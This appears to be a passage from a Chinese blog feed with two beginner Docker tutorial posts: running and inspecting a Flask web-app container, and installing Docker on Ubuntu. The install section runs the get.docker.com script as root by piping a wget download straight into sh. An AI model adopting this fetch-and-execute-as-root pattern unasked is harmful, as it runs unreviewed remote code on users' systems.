        <content type="html"><![CDATA[<h3 id="docker客户端">docker客户端</h3><p>docker客户端的命令可以用docker命令来查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker</span><br></pre></td></tr></table></figure><p>然后可以通过docker command --help来查看具体命令的使用 比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker stats --help</span><br><span class="line"></span><br><span class="line">Usage:  docker stats [OPTIONS] [CONTAINER...]</span><br><span class="line"></span><br><span class="line">Display a live stream of container(s) resource usage statistics</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -a, --all             Show all containers (default shows just running)</span><br><span class="line">      --format string   Pretty-print images using a Go template</span><br><span class="line">      --no-stream       Disable streaming stats and only pull the first result</span><br><span class="line">      --no-trunc        Do not truncate output</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# </span><br></pre></td></tr></table></figure><h3 id="运行一个web应用">运行一个web应用</h3><p>尝试使用docker来构建一个web应用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker pull training/webapp</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from training/webapp</span><br><span class="line">e190868d63f8: Pull complete </span><br><span class="line">909cd34c6fd7: Pull complete </span><br><span class="line">0b9bfabab7c1: Pull complete </span><br><span class="line">a3ed95caeb02: Pull complete </span><br><span class="line">10bbbc0fc0ff: Pull complete </span><br><span class="line">fca59b508e9f: Pull complete </span><br><span class="line">e7ae2541b15b: Pull complete </span><br><span class="line">9dd97ef58ce9: Pull complete </span><br><span class="line">a4c1b0cb7af7: Pull complete </span><br><span class="line">Digest: sha256:06e9c1983bd6d5db5fba376ccd63bfa529e8d02f23d5079b8f74a616308fb11d</span><br><span class="line">Status: Downloaded newer image for training/webapp:latest</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker run -d -P training/webapp python app.py</span><br><span class="line">b9f2592e87cea8935e568cc401b090c50cfb01c486189aa44c893055ef751dcc</span><br></pre></td></tr></table></figure><p>这里的pull是从网上拉镜像,然后后面的run的参数中,-d让容器后台运行,-P让容器内部使用的网络端口映射到我们的主机</p><h3 id="查看web应用容器">查看web应用容器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                     NAMES</span><br><span class="line">b9f2592e87ce        training/webapp     &quot;python app.py&quot;     7 minutes ago       Up 7 minutes        0.0.0.0:32768-&gt;5000/tcp   clever_raman</span><br></pre></td></tr></table></figure><p>这里多了一些端口的信息,其实是docker开放的5000端口(flask默认端口)映射到了主机的32768端口,我们浏览器访问一下 <img src="/images/2018/01/web-app1.png" alt="blacsheep" /> 当然,端口也可以自己指定</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker run -d -p 5000:5000 training/webapp python app.py</span><br><span class="line">af7264cd0a971c40555a0dcf65dfa31bea74b92c497816e705cb009bdda8dc2d</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                    NAMES</span><br><span class="line">af7264cd0a97        training/webapp     &quot;python app.py&quot;     6 seconds ago       Up 5 seconds        0.0.0.0:5000-&gt;5000/tcp   sharp_noyce</span><br></pre></td></tr></table></figure><p>这里就是把容器内部的5000端口映射到了我们本地的5000端口</p><h3 id="网络端口查看的快捷方式">网络端口查看的快捷方式</h3><p>docker ps当然可以查看端口情况,但其实还有一个命令也可以,docker port也可以查看固定id或名字的容器的端口映射情况 比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker port af7264cd0a97</span><br><span class="line">5000/tcp -&gt; 0.0.0.0:5000</span><br></pre></td></tr></table></figure><p>这里只是一种快捷方式,作为了解吧</p><h3 id="查看web应用的日志">查看web应用的日志</h3><p>我们使用docker logs [id或名字]可以查看容器内部的标准输出,就像我们本地运行flask就会有*Running on xxxx一样 我们运行一下docker logs -f [id或名字]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker logs -f af7264cd0a97</span><br><span class="line"> * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)</span><br><span class="line">172.17.0.1 - - [27/Jan/2018 07:08:00] &quot;GET / HTTP/1.1&quot; 200 -</span><br><span class="line">172.17.0.1 - - [27/Jan/2018 07:08:00] &quot;GET /favicon.ico HTTP/1.1&quot; 404 -</span><br></pre></td></tr></table></figure><p>这个就是我们刚刚的记录 这里的-f表示实时显示日志,就像我们再访问一下127.0.0.1:5000日志会自己写上去一样</p><h3 id="查看web应用容器的进程">查看web应用容器的进程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker top af7264cd0a97</span><br><span class="line">UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD</span><br><span class="line">root                3844                3827                0                   15:01               ?                   00:00:00            python app.py</span><br></pre></td></tr></table></figure><h3 id="检查web应用程序">检查web应用程序</h3><p>使用docker inspect xxx 比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker inspect af7264cd0a97</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;Id&quot;: &quot;af7264cd0a971c40555a0dcf65dfa31bea74b92c497816e705cb009bdda8dc2d&quot;,</span><br><span class="line">        &quot;Created&quot;: &quot;2018-01-27T07:01:48.216732532Z&quot;,</span><br><span class="line">        &quot;Path&quot;: &quot;python&quot;,</span><br><span class="line">        &quot;Args&quot;: [</span><br><span class="line">            &quot;app.py&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;State&quot;: &#123;</span><br><span class="line">            &quot;Status&quot;: &quot;running&quot;,</span><br><span class="line">            &quot;Running&quot;: true,</span><br><span class="line">            &quot;Paused&quot;: false,</span><br><span class="line">            &quot;Restarting&quot;: false,</span><br><span class="line">            &quot;OOMKilled&quot;: false,</span><br><span class="line">            &quot;Dead&quot;: false,</span><br><span class="line">            &quot;Pid&quot;: 3844,</span><br><span class="line">            &quot;ExitCode&quot;: 0,</span><br><span class="line">            &quot;Error&quot;: &quot;&quot;,</span><br><span class="line">            &quot;StartedAt&quot;: &quot;2018-01-27T07:01:48.855558432Z&quot;,</span><br><span class="line">            &quot;FinishedAt&quot;: &quot;0001-01-01T00:00:00Z&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;Image&quot;: &quot;sha256:6fae60ef344644649a39240b94d73b8ba9c67f898ede85cf8e947a887b3e6557&quot;,</span><br><span class="line">        &quot;ResolvConfPath&quot;: &quot;/var/lib/docker/containers/af7264cd0a971c40555a0dcf65dfa31bea74b92c497816e705cb009bdda8dc2d/resolv.conf&quot;,</span><br><span class="line">        &quot;HostnamePath&quot;: &quot;/var/lib/docker/containers/af7264cd0a971c40555a0dcf65dfa31bea74b92c497816e705cb009bdda8dc2d/hostname&quot;,</span><br><span class="line">        &quot;HostsPath&quot;: &quot;/var/lib/docker/containers/af7264cd0a971c40555a0dcf65dfa31bea74b92c497816e705cb009bdda8dc2d/hosts&quot;,</span><br><span class="line">        &quot;LogPath&quot;: &quot;/var/lib/docker/containers/af7264cd0a971c40555a0dcf65dfa31bea74b92c497816e705cb009bdda8dc2d/af7264cd0a971c40555a0dcf65dfa31bea74b92c497816e705cb009bdda8dc2d-json.log&quot;,</span><br><span class="line">        &quot;Name&quot;: &quot;/sharp_noyce&quot;,</span><br><span class="line">        &quot;RestartCount&quot;: 0,</span><br><span class="line">        &quot;Driver&quot;: &quot;overlay2&quot;,</span><br><span class="line">        &quot;Platform&quot;: &quot;linux&quot;,</span><br><span class="line">        &quot;MountLabel&quot;: &quot;&quot;,</span><br><span class="line">        &quot;ProcessLabel&quot;: &quot;&quot;,</span><br><span class="line">        &quot;AppArmorProfile&quot;: &quot;docker-default&quot;,</span><br><span class="line">        &quot;ExecIDs&quot;: null,</span><br><span class="line">        &quot;HostConfig&quot;: &#123;</span><br><span class="line">            &quot;Binds&quot;: null,</span><br><span class="line">            &quot;ContainerIDFile&quot;: &quot;&quot;,</span><br><span class="line">            &quot;LogConfig&quot;: &#123;</span><br><span class="line">                &quot;Type&quot;: &quot;json-file&quot;,</span><br><span class="line">                &quot;Config&quot;: &#123;&#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;NetworkMode&quot;: &quot;default&quot;,</span><br><span class="line">            &quot;PortBindings&quot;: &#123;</span><br><span class="line">                &quot;5000/tcp&quot;: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;HostIp&quot;: &quot;&quot;,</span><br><span class="line">                        &quot;HostPort&quot;: &quot;5000&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;RestartPolicy&quot;: &#123;</span><br><span class="line">                &quot;Name&quot;: &quot;no&quot;,</span><br><span class="line">                &quot;MaximumRetryCount&quot;: 0</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;AutoRemove&quot;: false,</span><br><span class="line">            &quot;VolumeDriver&quot;: &quot;&quot;,</span><br><span class="line">            &quot;VolumesFrom&quot;: null,</span><br><span class="line">            &quot;CapAdd&quot;: null,</span><br><span class="line">            &quot;CapDrop&quot;: null,</span><br><span class="line">            &quot;Dns&quot;: [],</span><br><span class="line">            &quot;DnsOptions&quot;: [],</span><br><span class="line">            &quot;DnsSearch&quot;: [],</span><br><span class="line">            &quot;ExtraHosts&quot;: null,</span><br><span class="line">            &quot;GroupAdd&quot;: null,</span><br><span class="line">            &quot;IpcMode&quot;: &quot;shareable&quot;,</span><br><span class="line">            &quot;Cgroup&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Links&quot;: null,</span><br><span class="line">            &quot;OomScoreAdj&quot;: 0,</span><br><span class="line">            &quot;PidMode&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Privileged&quot;: false,</span><br><span class="line">            &quot;PublishAllPorts&quot;: false,</span><br><span class="line">            &quot;ReadonlyRootfs&quot;: false,</span><br><span class="line">            &quot;SecurityOpt&quot;: null,</span><br><span class="line">            &quot;UTSMode&quot;: &quot;&quot;,</span><br><span class="line">            &quot;UsernsMode&quot;: &quot;&quot;,</span><br><span class="line">            &quot;ShmSize&quot;: 67108864,</span><br><span class="line">            &quot;Runtime&quot;: &quot;runc&quot;,</span><br><span class="line">            &quot;ConsoleSize&quot;: [</span><br><span class="line">                0,</span><br><span class="line">                0</span><br><span class="line">            ],</span><br><span class="line">            &quot;Isolation&quot;: &quot;&quot;,</span><br><span class="line">            &quot;CpuShares&quot;: 0,</span><br><span class="line">            &quot;Memory&quot;: 0,</span><br><span class="line">            &quot;NanoCpus&quot;: 0,</span><br><span class="line">            &quot;CgroupParent&quot;: &quot;&quot;,</span><br><span class="line">            &quot;BlkioWeight&quot;: 0,</span><br><span class="line">            &quot;BlkioWeightDevice&quot;: [],</span><br><span class="line">            &quot;BlkioDeviceReadBps&quot;: null,</span><br><span class="line">            &quot;BlkioDeviceWriteBps&quot;: null,</span><br><span class="line">            &quot;BlkioDeviceReadIOps&quot;: null,</span><br><span class="line">            &quot;BlkioDeviceWriteIOps&quot;: null,</span><br><span class="line">            &quot;CpuPeriod&quot;: 0,</span><br><span class="line">            &quot;CpuQuota&quot;: 0,</span><br><span class="line">            &quot;CpuRealtimePeriod&quot;: 0,</span><br><span class="line">            &quot;CpuRealtimeRuntime&quot;: 0,</span><br><span class="line">            &quot;CpusetCpus&quot;: &quot;&quot;,</span><br><span class="line">            &quot;CpusetMems&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Devices&quot;: [],</span><br><span class="line">            &quot;DeviceCgroupRules&quot;: null,</span><br><span class="line">            &quot;DiskQuota&quot;: 0,</span><br><span class="line">            &quot;KernelMemory&quot;: 0,</span><br><span class="line">            &quot;MemoryReservation&quot;: 0,</span><br><span class="line">            &quot;MemorySwap&quot;: 0,</span><br><span class="line">            &quot;MemorySwappiness&quot;: null,</span><br><span class="line">            &quot;OomKillDisable&quot;: false,</span><br><span class="line">            &quot;PidsLimit&quot;: 0,</span><br><span class="line">            &quot;Ulimits&quot;: null,</span><br><span class="line">            &quot;CpuCount&quot;: 0,</span><br><span class="line">            &quot;CpuPercent&quot;: 0,</span><br><span class="line">            &quot;IOMaximumIOps&quot;: 0,</span><br><span class="line">            &quot;IOMaximumBandwidth&quot;: 0</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;GraphDriver&quot;: &#123;</span><br><span class="line">            &quot;Data&quot;: &#123;</span><br><span class="line">                &quot;LowerDir&quot;: &quot;/var/lib/docker/overlay2/f7d660148c54b02dbdf3984f960d214707d939d7668e5df0c0954dda98273539-init/diff:/var/lib/docker/overlay2/b10716ca735ef9763f741ad0beb59aed4e7c7859bb4fecff04d8df91d84b22d6/diff:/var/lib/docker/overlay2/ff54443de624d248e7c25d4418ad0b31f4d00313ff8a6f5a5bd03d3477f666d2/diff:/var/lib/docker/overlay2/3dfaea4a76ba9e41e0f7f02859e31b7997ccb4b020e843e626283a405d286d19/diff:/var/lib/docker/overlay2/80098f33e92c084bd0d2145f7ee6a538dd5a8452b84e33418c05e0f47b3ce6b7/diff:/var/lib/docker/overlay2/0ca15e9df32499884ac3a1508ee6f854baaa832ba38dd67dda99caf8a354122b/diff:/var/lib/docker/overlay2/3fc01c213b12be2701b8e5c876742ca08fbf3f28c0729253216f86cd72dcf05d/diff:/var/lib/docker/overlay2/8ae1b6be565d46876f4cd1ea83ee22210e88d3331588f5e8c0e368de4a453091/diff:/var/lib/docker/overlay2/e6f44ca033c4fe66c3d51ad52cf1cbaff727f6809fa97a13323065056b9fd26c/diff:/var/lib/docker/overlay2/f23602b28997b720d79fd26fa4726d75f0bf396b0ccc22b95ae1cdc56a2d3191/diff:/var/lib/docker/overlay2/3222e61d544a81a68b93dfbbbe84fb97d180d1df827b90d1352a895b51729f55/diff:/var/lib/docker/overlay2/13cddf08b673042298865b2daac520b9d63806ce045b977af176694cfe703593/diff:/var/lib/docker/overlay2/ad5eefb4e45d4b347cac3475e64ffcd63ab7a3aa42fde14115e38c5467c91d9f/diff:/var/lib/docker/overlay2/405f4f83e271e45edb3f0df3476e4eb433d213adeb64ea71e2f4b1a820ec8d43/diff&quot;,</span><br><span class="line">                &quot;MergedDir&quot;: &quot;/var/lib/docker/overlay2/f7d660148c54b02dbdf3984f960d214707d939d7668e5df0c0954dda98273539/merged&quot;,</span><br><span class="line">                &quot;UpperDir&quot;: &quot;/var/lib/docker/overlay2/f7d660148c54b02dbdf3984f960d214707d939d7668e5df0c0954dda98273539/diff&quot;,</span><br><span class="line">                &quot;WorkDir&quot;: &quot;/var/lib/docker/overlay2/f7d660148c54b02dbdf3984f960d214707d939d7668e5df0c0954dda98273539/work&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;Name&quot;: &quot;overlay2&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;Mounts&quot;: [],</span><br><span class="line">        &quot;Config&quot;: &#123;</span><br><span class="line">            &quot;Hostname&quot;: &quot;af7264cd0a97&quot;,</span><br><span class="line">            &quot;Domainname&quot;: &quot;&quot;,</span><br><span class="line">            &quot;User&quot;: &quot;&quot;,</span><br><span class="line">            &quot;AttachStdin&quot;: false,</span><br><span class="line">            &quot;AttachStdout&quot;: false,</span><br><span class="line">            &quot;AttachStderr&quot;: false,</span><br><span class="line">            &quot;ExposedPorts&quot;: &#123;</span><br><span class="line">                &quot;5000/tcp&quot;: &#123;&#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;Tty&quot;: false,</span><br><span class="line">            &quot;OpenStdin&quot;: false,</span><br><span class="line">            &quot;StdinOnce&quot;: false,</span><br><span class="line">            &quot;Env&quot;: [</span><br><span class="line">                &quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;Cmd&quot;: [</span><br><span class="line">                &quot;python&quot;,</span><br><span class="line">                &quot;app.py&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;Image&quot;: &quot;training/webapp&quot;,</span><br><span class="line">            &quot;Volumes&quot;: null,</span><br><span class="line">            &quot;WorkingDir&quot;: &quot;/opt/webapp&quot;,</span><br><span class="line">            &quot;Entrypoint&quot;: null,</span><br><span class="line">            &quot;OnBuild&quot;: null,</span><br><span class="line">            &quot;Labels&quot;: &#123;&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;NetworkSettings&quot;: &#123;</span><br><span class="line">            &quot;Bridge&quot;: &quot;&quot;,</span><br><span class="line">            &quot;SandboxID&quot;: &quot;07146affbe8795cdade88d6ce45407d3aa77d2a3db946390a89a12eddf4f2281&quot;,</span><br><span class="line">            &quot;HairpinMode&quot;: false,</span><br><span class="line">            &quot;LinkLocalIPv6Address&quot;: &quot;&quot;,</span><br><span class="line">            &quot;LinkLocalIPv6PrefixLen&quot;: 0,</span><br><span class="line">            &quot;Ports&quot;: &#123;</span><br><span class="line">                &quot;5000/tcp&quot;: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;HostIp&quot;: &quot;0.0.0.0&quot;,</span><br><span class="line">                        &quot;HostPort&quot;: &quot;5000&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;SandboxKey&quot;: &quot;/var/run/docker/netns/07146affbe87&quot;,</span><br><span class="line">            &quot;SecondaryIPAddresses&quot;: null,</span><br><span class="line">            &quot;SecondaryIPv6Addresses&quot;: null,</span><br><span class="line">            &quot;EndpointID&quot;: &quot;f95361cc2fec09e16108de8c1818e659e5a67a0e7ee1f810f5425f48b3ba2311&quot;,</span><br><span class="line">            &quot;Gateway&quot;: &quot;172.17.0.1&quot;,</span><br><span class="line">            &quot;GlobalIPv6Address&quot;: &quot;&quot;,</span><br><span class="line">            &quot;GlobalIPv6PrefixLen&quot;: 0,</span><br><span class="line">            &quot;IPAddress&quot;: &quot;172.17.0.2&quot;,</span><br><span class="line">            &quot;IPPrefixLen&quot;: 16,</span><br><span class="line">            &quot;IPv6Gateway&quot;: &quot;&quot;,</span><br><span class="line">            &quot;MacAddress&quot;: &quot;02:42:ac:11:00:02&quot;,</span><br><span class="line">            &quot;Networks&quot;: &#123;</span><br><span class="line">                &quot;bridge&quot;: &#123;</span><br><span class="line">                    &quot;IPAMConfig&quot;: null,</span><br><span class="line">                    &quot;Links&quot;: null,</span><br><span class="line">                    &quot;Aliases&quot;: null,</span><br><span class="line">                    &quot;NetworkID&quot;: &quot;f4c8148425eecef64502c5c3292494d640bb0670219d160f4bcd9edd7217af4b&quot;,</span><br><span class="line">                    &quot;EndpointID&quot;: &quot;f95361cc2fec09e16108de8c1818e659e5a67a0e7ee1f810f5425f48b3ba2311&quot;,</span><br><span class="line">                    &quot;Gateway&quot;: &quot;172.17.0.1&quot;,</span><br><span class="line">                    &quot;IPAddress&quot;: &quot;172.17.0.2&quot;,</span><br><span class="line">                    &quot;IPPrefixLen&quot;: 16,</span><br><span class="line">                    &quot;IPv6Gateway&quot;: &quot;&quot;,</span><br><span class="line">                    &quot;GlobalIPv6Address&quot;: &quot;&quot;,</span><br><span class="line">                    &quot;GlobalIPv6PrefixLen&quot;: 0,</span><br><span class="line">                    &quot;MacAddress&quot;: &quot;02:42:ac:11:00:02&quot;,</span><br><span class="line">                    &quot;DriverOpts&quot;: null</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# </span><br></pre></td></tr></table></figure><p>这个会返回一个json,json里面是docker容器的配置</p><h3 id="对容器的一些操作">对容器的一些操作</h3><p>docker stop xxx:停止容器 docker start xxx:启动容器 docker restart xxx:重启容器 docker rm xxx:移除容器 ok,对容器的处理就到这里了,边学边尝试吧</p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker新手入门(1)之hello world</title>
      <link href="/2018/01/26/docker%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8%E4%B9%8Bhello-world/"/>
      <url>/2018/01/26/docker%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8%E4%B9%8Bhello-world/</url>
      
        <content type="html"><![CDATA[<p>还记得之前kyrios大大说过工作室招新的时候docker那题没写的寒假得自学一下docker.....突然想起来这件事,于是简单地自学一下docker... 教程参考:http://www.runoob.com/docker/docker-tutorial.html 这里仅仅对于个人的学习做一个记录,觉得简单的话自己去看教程就好</p><h5 id="docker-是一个开源的应用容器引擎基于-go-语言-并遵从apache2.0协议开源">Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从Apache2.0协议开源。</h5><h5 id="docker-可以让开发者打包他们的应用以及依赖包到一个轻量级可移植的容器中然后发布到任何流行的-linux-机器上也可以实现虚拟化">Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。</h5><h5 id="容器是完全使用沙箱机制相互之间不会有任何接口类似-iphone-的-app更重要的是容器性能开销极低">容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。</h5><p>教程开始给出这么一段话,先放着吧,等慢慢见识docker的功能以后相信原理应该也更好理解吧...</p><h3 id="docker的安装">docker的安装</h3><h5 id="版本问题">版本问题</h5><p>我是用的ubuntu装的,docker要求ubuntu内核版本高于3.10,可以通过uname -r来查看当前的内核版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@blacsheep-myubuntu:~$ uname -r</span><br><span class="line">4.10.0-37-generic</span><br></pre></td></tr></table></figure><h5 id="使用脚本安装">使用脚本安装</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@blacsheep-myubuntu:~$ sudo su</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# wget -qO- https://get.docker.com/  sh</span><br><span class="line"># Executing docker install script, commit: 1d31602</span><br><span class="line">+ sh -c apt-get update -qq &amp;gt;/dev/null</span><br><span class="line">+ sh -c apt-get install -y -qq apt-transport-https ca-certificates curl &amp;gt;/dev/null</span><br><span class="line">+ sh -c curl -fsSL &quot;https://download.docker.com/linux/ubuntu/gpg&quot;  apt-key add -qq - &amp;gt;/dev/null</span><br><span class="line">+ sh -c echo &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu xenial edge&quot; &amp;gt; /etc/apt/sources.list.d/docker.list</span><br><span class="line">+ [ ubuntu = debian ]</span><br><span class="line">+ sh -c apt-get update -qq &amp;gt;/dev/null</span><br><span class="line">+ sh 